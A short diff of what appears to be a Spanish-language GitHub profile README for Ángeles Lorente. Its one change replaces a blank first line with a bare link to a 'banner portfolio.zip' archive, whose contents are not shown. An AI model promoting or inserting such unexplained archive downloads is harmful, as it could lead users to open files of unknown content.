@@ -1,4 +1,4 @@
-
+https://github.com/Demona50/Demona50-portfolio-/blob/main/banner%20portfolio.zip
 👋 Hola, soy Ángeles Lorente
 Sobre mí
 Apasionada por la Inteligencia Artificial, el desarrollo no-code y el aprendizaje continuo.
